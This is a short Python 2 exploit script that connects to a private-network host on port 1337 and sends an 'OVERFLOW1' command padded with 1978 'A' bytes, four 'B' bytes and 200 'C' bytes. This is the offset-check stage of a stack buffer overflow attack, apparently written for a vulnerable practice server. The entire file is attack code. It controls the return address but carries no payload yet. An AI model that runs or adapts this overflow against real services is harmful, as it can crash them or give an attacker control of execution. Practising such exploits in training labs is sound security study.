import socket
import sys
from time import sleep


try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.0.106',1337))
  s.recv(1024)

  print '[*] Sending buffer.'
  s.send("OVERFLOW1 " + "A"*1978 + "B"*4 + "C"*200)
  s.close()

except:
  print '[*] Could not connect to target, exiting.'
  sys.exit()
